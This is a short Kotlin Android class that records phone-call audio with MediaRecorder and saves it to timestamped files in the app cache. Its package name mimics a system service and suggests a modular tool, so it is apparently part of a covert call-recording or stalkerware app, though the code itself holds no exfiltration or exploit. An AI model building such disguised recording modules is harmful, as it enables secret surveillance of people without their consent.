// [context: Kotlin, Android API 26+, ambient call audio via MediaRecorder]
package com.system.service.modules.calls

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import java.io.File

class CallRecorder(private val context: Context) {

    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null

    fun start(): File? {
        stop()
        val f = File(context.cacheDir, "rec_${System.currentTimeMillis()}.m4a")
        outputFile = f
        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
            MediaRecorder(context) else @Suppress("DEPRECATION") MediaRecorder()
        recorder?.apply {
            setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioSamplingRate(16000)
            setAudioChannels(1)
            setOutputFile(f.absolutePath)
            try { prepare(); start() } catch (_: Exception) { return null }
        }
        return f
    }

    fun stop(): File? {
        return try {
            recorder?.stop()
            recorder?.release()
            recorder = null
            outputFile
        } catch (_: Exception) {
            recorder = null
            null
        }
    }
}
